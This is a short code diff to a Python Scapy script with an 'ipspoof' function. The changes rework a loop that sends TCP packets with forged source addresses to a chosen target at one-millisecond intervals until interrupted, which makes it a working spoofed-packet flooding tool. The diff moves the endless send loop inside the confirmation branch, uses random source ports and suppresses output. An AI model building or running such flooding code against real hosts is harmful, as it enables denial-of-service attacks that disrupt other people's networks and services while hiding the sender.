@@ -17,7 +17,7 @@ def ipspoof(source_ip, source_port, target_ip, target_port):
         else:
             src_ip = f'{source_ip}'
         if source_port.lower() == 'r':
-            src_port = int(random.randint(1, 5555))
+            src_port = RandShort()
         else:
             src_port = int(source_port)
         
@@ -32,13 +32,16 @@ def ipspoof(source_ip, source_port, target_ip, target_port):
             IP1 = IP(src=src_ip, dst=tgt_ip)
             TCP1 = TCP(sport=src_port, dport=tgt_port)
             pkt = IP1 / TCP1
+
+            while True:
+                send(pkt, inter= .001, verbose=0)
+                print(f"Packet(s) sent [{i}]")
+                i=i+1
+
         else:
             print('Operation was cancelled.')
             sys.exit('\n')
-        while True:
-            send(pkt,inter= .001)
-            print(f"Packet(s) sent [{i}]")
-            i=i+1
+        
     except KeyboardInterrupt:
         sys.exit('\n')
     except Exception as e:
